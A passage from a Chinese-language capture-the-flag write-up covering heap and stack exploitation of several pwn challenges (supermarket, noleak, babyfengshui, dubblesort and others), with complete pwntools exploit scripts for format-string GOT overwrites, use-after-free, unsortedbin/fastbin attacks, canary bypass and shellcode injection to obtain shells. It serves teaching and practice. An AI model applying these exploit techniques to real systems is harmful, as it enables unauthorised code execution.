<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./greeting-150&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&#x27;220.249.52.133&#x27;,38405)</span></span><br><span class="line">strlen_got = <span class="number">0x8049A54</span></span><br><span class="line">system_got = <span class="number">0x8049A48</span></span><br><span class="line">main_addr = <span class="number">0x80485ED</span>  </span><br><span class="line">init_array = <span class="number">0x8049934</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;aa&#x27;</span></span><br><span class="line">payload += p32(strlen_got)</span><br><span class="line">payload += p32(strlen_got+<span class="number">2</span>)</span><br><span class="line">payload += p32(init_array)</span><br><span class="line">arr = [  </span><br><span class="line">   <span class="number">0x85ED</span>,  </span><br><span class="line">   <span class="number">0x8490</span>,</span><br><span class="line">   <span class="number">0x804</span>  </span><br><span class="line">]</span><br><span class="line">num = arr[<span class="number">2</span>] - <span class="number">32</span>  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">1</span>] - arr[<span class="number">2</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%12$hn&#x27;</span></span><br><span class="line">num = arr[<span class="number">0</span>] - arr[<span class="number">1</span>]  </span><br><span class="line">payload += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(num) + <span class="string">&#x27;c%14$hn&#x27;</span>  </span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">len</span>(payload)  )</span><br><span class="line">p.sendline(payload) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201125094520178.png" alt="image-20201125094520178"></p>
<h2 id="17-secret-file"><a href="#17-secret-file" class="headerlink" title="17.secret_file"></a>17.secret_file</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209180235402.png" alt="image-20201209180235402"></p>
<h2 id="18-supermarket"><a href="#18-supermarket" class="headerlink" title="18.supermarket"></a>18.supermarket</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100516746.png" alt="image-20201221100516746"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221100534999.png" alt="image-20201221100534999"></p>
<h3 id="代码分析-12"><a href="#代码分析-12" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171344578.png" alt="image-20201222171344578"></p>
<p>程序实现了商品的添加、删除、查询、更改。其中商品又名称、价格、描述，可以修改价格和描述。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172654517.png" alt="image-20201222172654517"></p>
<p>程序所用堆的结构大致为：其中，description的chunk大小是可以被我们控制的。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222172643751.png" alt="image-20201222172643751"></p>
<p>漏洞出现在修改描述上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222171556274.png" alt="image-20201222171556274"></p>
<p>realloc函数作用大概如下：</p>
<p>1）如果当前内存段后面有需要的内存空间，则直接扩展这段内存空间，realloc()将返回原指针。<br>2）如果当前内存段后面的空闲字节不够，那么就使用堆中的第一个能够满足这一要求的内存块，将目前的数据复制到新的位置，并将原来的数据块释放掉，返回新的内存块位置。<br>3）如果申请失败，将返回NULL，此时，原来的指针仍然有效。</p>
<p>也就是说，如果在修改描述时申请的空间比之前大，原来的会被free掉，但是这里没有把新的地址赋给指向描述的指针，存在UAF漏洞。</p>
<h3 id="思路及利用-11"><a href="#思路及利用-11" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>保护并没有限制修改got表，而且程序也提供了输出函数。那么大致的思路就是，先泄露got地址，确定真实地址、libc版本，找到system函数地址，修改got表项为system，输入“/bin/sh”获得shell，这里选择atoi比较方便。</p>
<p>接下来就是如何实现的问题：</p>
<ul>
<li>先申请一个description大于fastbin大小的chunk（0x80）的商品0.</li>
<li>再申请一个较小的商品1（用来分隔，如果不用商品1来分隔，则realoc直接扩展商品0的descript的大小至新size）。</li>
<li>修改商品0的描述，大小改为0x90.出发realoc函数。</li>
<li>申请商品2，描述大小为0x80.这样商品2首先申请结构体就是商品0的描述。（商品的结构体为0x1c）</li>
<li>这样修改商品0的描述就是修改商品2，首先将商品2的<code>*description</code>改为atoi的got地址，输出。</li>
<li>获得system地址，修改商品2的描述就是修改atoi的got表项。</li>
</ul>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222175100455.png" alt="image-20201222175100455"></p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *  </span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./supermarket&#x27;)  </span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>,<span class="number">48203</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./supermarket&#x27;</span>)  </span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;price:&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span>  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(index))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;descrip_size:&#x27;</span>,<span class="built_in">str</span>(size))  </span><br><span class="line">   p.sendlineafter(<span class="string">&#x27;description:&#x27;</span>,content) </span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x10</span>)  </span><br><span class="line"><span class="comment">#注意不要加任何数据，因为我们发送的数据写入到的是一个被free的块</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">&#x27;&#x27;</span>)  </span><br><span class="line">create(<span class="number">2</span>,<span class="number">0x20</span>,<span class="string">&#x27;2&#x27;</span>*<span class="number">0x10</span>) </span><br><span class="line"><span class="comment">#修改商品0的描述，就是修改商品2，这里需要保留商品2的名称、描述大小</span></span><br><span class="line">payload = <span class="string">b&#x27;2&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p32(<span class="number">20</span>) + p32(<span class="number">0x20</span>) + p32(atoi_got)  </span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x80</span>,payload)</span><br><span class="line"><span class="comment">#泄露地址</span></span><br><span class="line">show()  </span><br><span class="line">p.recvuntil(<span class="string">&#x27;2: price.20, des.&#x27;</span>)  </span><br><span class="line"><span class="comment"># print(p.recv())</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">atoi_addr = u32(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">b&#x27;\n&#x27;</span>)[<span class="number">0</span>].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))  </span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;atoi&#x27;</span>,atoi_addr)  </span><br><span class="line">libc_base = atoi_addr - libc.dump(<span class="string">&#x27;atoi&#x27;</span>)  </span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)  </span><br><span class="line"><span class="comment">#修改atoi的表，将它指向system  </span></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x20</span>,p32(system_addr))  </span><br><span class="line">p.sendlineafter(<span class="string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">p.interactive()  </span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222182139072.png" alt="image-20201222182139072"></p>
<h2 id="19-noleak"><a href="#19-noleak" class="headerlink" title="19. noleak"></a>19. noleak</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093630034.png" alt="image-20201221093630034"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201221093644804.png" alt="image-20201221093644804"></p>
<h3 id="代码分析-13"><a href="#代码分析-13" class="headerlink" title="代码分析"></a>代码分析</h3><p>首先，附件已经提示，<strong>程序是在glibc 2.23下的。</strong></p>
<p>程序是一个自定义的堆管理，实现了添加、删除和更新功能。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162245601.png" alt="image-20201222162245601"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222162413637.png" alt="image-20201222162413637"></p>
<p>其中漏洞出现再删除和更新上，如图注释所示。由于删除没有置null，存在UAF漏洞，更新存在堆溢出漏洞。</p>
<h3 id="思路及利用-12"><a href="#思路及利用-12" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>由于为<code> Full RELRO</code>，不能更改got表。</p>
<p>整个程序没有输出的选项，也就无法泄露地址（noleak）</p>
<p>而存在UAF漏洞，是可以做到任意地址写的，所以考虑是修改hook函数，将<strong>__malloc_hook</strong>函数修改，这样调用malloc时就会调用 malloc_hook里的指针。</p>
<p>想要修改malloc_hook我们就想到了unsortedbin attack。因为一般来讲，malloc_hook与unsordtedbin相隔不远。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222202509095.png" alt="image-20201222202509095"></p>
<p>程序通过一个在bss段的全局数组管理堆，目标就是通过unsortedbin attack将__malloc_hook的地址写入到这个全局数组上。</p>
<p>为了达成这一目标，首先要是使用unsortedbin attack将unsortedbin的地址写入bss段，然后将最后的俩位从78改为10.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortedbin attack</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222205731171.png" alt="image-20201222205731171"></p>
<p>程序并没有开启堆栈不可知性，可以将shellcode写入bss段，然后就是将__malloc_hook里的指针指向写入的shellcoed就可以得到shell。</p>
<p>接下来就是考虑如何修改的问题，由于之前使用了unsortedbin attack，破坏了unsortedbin的结构，因此这里使用fastbinattack，申请chunk即在全局数组，然后通过修改数组的值，借助update函数，将78改为10。</p>
<p>而使用fastbinattack，需要绕过size检查，可以借助写入的7f，这里需要计算一下偏移让伪造的size位为7f。也就是从0x60106d开始。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211533132.png" alt="image-20201222211533132"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222211642972.png" alt="image-20201222211642972"></p>
<p>然后就是申请0x60大小的chunk，之后我们在数组索引为8，9的位置分别写入了存储泄露出的地址的<code>0x601070</code>和指针数组的开头<code>0x601040</code>，方便我们接下来写入shellcode.</p>
<p><code>new(0x60,b&#39;\x00&#39;*3+p64(0x601070)+p64(0x601040))</code><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212109392.png" alt="image-20201222212109392"></p>
<p>这样就可以通过修改数组8，改78为10，然后修改数组6（0x601070）为输入的shellcode（数组开端），通过修改数组9，将shellcode写入bss段（从0x601040开始）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br></pre></td></tr></table></figure>

<p>最后调用malloc就可以得到shell。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222212557359.png" alt="image-20201222212557359"></p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./timu&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;node3.buuoj.cn&quot;,28605)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;220.249.52.134&quot;,58955)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span>(<span class="params">idx, size, data</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Data&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">new(<span class="number">0x20</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>)+p64(<span class="number">0x601060</span>)</span><br><span class="line">update(<span class="number">0</span>,<span class="number">0x10</span>,payload)</span><br><span class="line">new(<span class="number">0x80</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">update(<span class="number">1</span>, <span class="number">8</span>, p64(<span class="number">0x60106d</span>))</span><br><span class="line">new(<span class="number">0x60</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">0x60</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">3</span>+p64(<span class="number">0x601070</span>)+p64(<span class="number">0x601040</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update(<span class="number">8</span>, <span class="number">1</span>, <span class="string">b&#x27;\x10&#x27;</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">6</span>, <span class="number">8</span>, p64(<span class="number">0x601040</span>))</span><br><span class="line">update(<span class="number">9</span>, <span class="number">256</span>, asm(shellcraft.amd64.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice :&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Size&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="20-babyfengshui"><a href="#20-babyfengshui" class="headerlink" title="20. babyfengshui"></a>20. babyfengshui</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222220954444.png" alt="image-20201222220954444"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221013962.png" alt="image-20201222221013962"></p>
<h3 id="代码分析-14"><a href="#代码分析-14" class="headerlink" title="代码分析"></a>代码分析</h3><p>程序实现了添加新用户、删除、更改等操作。</p>
<p>其结构如图所示：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222222940532.png" alt="image-20201222222940532"></p>
<p>一般来讲，申请的chunk是相邻的。</p>
<p>漏洞出现在更改上。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222221324550.png" alt="image-20201222221324550"></p>
<p>这里是一个检查溢出的判断，可以从结构图就可以看出，这种溢出检验是基于两个chunk是紧邻的。如果一个用户的两个chunk不相邻，且desc在node的前面，就可以做到溢出。</p>
<h3 id="思路及利用-13"><a href="#思路及利用-13" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>接下的问题就是如何将一个用户的两个chunk分开。</p>
<p>先申请三个一样大小（0x80）的用户，删除用户0，unlink会有一个0x100的空闲块，再申请用户3，大小0x100，就将用户3的node与desc分开。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222223555039.png" alt="image-20201222223555039"></p>
<p>然后使用溢出，修改用户1node的description指针为free的got，先泄露地址，再修改为system。最后调用free，得到shell。这里将用户2的description写为“/bin/sh\x00”</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>,<span class="number">54735</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyfengshui&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;name: &quot;</span>,<span class="string">&#x27;ffff&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">display</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">updata</span>(<span class="params">index,length,text</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Action: &quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;length: &quot;</span>,<span class="built_in">str</span>(length))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;text: &quot;</span>,text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x198</span>+p32(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">add(<span class="number">0x100</span>,<span class="number">0x19C</span>,payload)</span><br><span class="line"></span><br><span class="line">display(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;free&quot;</span>,free_addr) </span><br><span class="line">offset = free_addr - libc.dump(<span class="string">&quot;free&quot;</span>) </span><br><span class="line">system_addr = offset + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"></span><br><span class="line">updata(<span class="number">1</span>,<span class="number">4</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201222224732060.png" alt="image-20201222224732060"></p>
<h2 id="21-dubblesort"><a href="#21-dubblesort" class="headerlink" title="21. dubblesort"></a>21. dubblesort</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081129516.png" alt="image-20201223081129516"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223081203985.png" alt="image-20201223081203985"></p>
<h3 id="代码分析-15"><a href="#代码分析-15" class="headerlink" title="代码分析"></a>代码分析</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082332571.png" alt="image-20201223082332571"></p>
<p>程序的功能是实现一个排序，漏洞主要出现如图所示的两个位置。</p>
<p>没有调用memset对buf清空，里面可能有敏感数据。对输入的整数个数没有上限限制，可以造成栈溢出。</p>
<h3 id="思路及利用-14"><a href="#思路及利用-14" class="headerlink" title="思路及利用"></a>思路及利用</h3><p>首先查看buf里的数据，发现<code>_GLOBAL_OFFSET_TABLE_</code>。可以据此算出libc基址，进而得到system函数地址。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223082737721.png" alt="image-20201223082737721"></p>
<p><code> 0xffffcee0-0xffffcec8=24</code>也就是说，只要输入24个字符，就顺带输出<code>_GLOBAL_OFFSET_TABLE_</code>。</p>
<p>然后考虑栈溢出，canary保护开启，需要泄露或绕过。</p>
<p>显然这个程序中泄露是不可行的，而sacnf的特性能帮助我们绕过canary。</p>
<p>当 scanf 函数接收到不符合格式化字符串的字符时，不会将其放入栈空间中。所以可以在canary处输入<code>+、—</code>等字符绕过canary。</p>
<p><code>_GLOBAL_OFFSET_TABLE_</code>与libc的基址的偏移固定，需要先算出来。</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091146979.png" alt="image-20201223091146979">可以知道v12处是canary。</p>
<p>因此，我们先输入(0x70-0x10)/4 = 24个整数，然后接下来输入+或-号，跳过当前输入，然后我们到达ebp-0xC处，距离返回地址ebp+0x4还差0x10/4=4个，因此，我们继续输入4个整数，接下来，我们再输入ROP即可。</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./dubblesort&#x27;</span>,env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">&quot;./libc_32.so.6&quot;</span>&#125;)  </span><br><span class="line">sh = remote(<span class="string">&#x27;220.249.52.134&#x27;</span>, <span class="number">49887</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)  </span><br><span class="line">off = <span class="number">0x1AE244</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#泄露地址并计算出libc的地址  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x1C</span>  </span><br><span class="line">sh.sendafter(<span class="string">&#x27;name :&#x27;</span>,payload)  </span><br><span class="line">sh.recvuntil(payload)  </span><br><span class="line"><span class="comment">#计算libc加载地址  </span></span><br><span class="line">libc_base = u32(sh.recv(<span class="number">4</span>)) - off  </span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]  </span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)  </span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)  </span><br><span class="line">  </span><br><span class="line">n = <span class="number">35</span>  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;sort :&#x27;</span>,<span class="built_in">str</span>(n))  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,n<span class="number">-11</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(<span class="number">0</span>))  </span><br><span class="line">  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="string">&#x27;+&#x27;</span>)  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">9</span>):  </span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(system_addr))  </span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;number :&#x27;</span>,<span class="built_in">str</span>(binsh_addr))  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<p>最终结果：</p>
<p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091348996.png" alt="image-20201223091348996"></p>
<h2 id="21-RCalc"><a href="#21-RCalc" class="headerlink" title="21. RCalc"></a>21. RCalc</h2><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091552374.png" alt="image-20201223091552374"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201223091611277.png" alt="image-20201223091611277"></p>
<h3 id="代码分析-16"><a href="#代码分析-16" class="headerlink" title="代码分析"></a>代码分析</h3><p>整个程序模拟了一个计算器。</p>
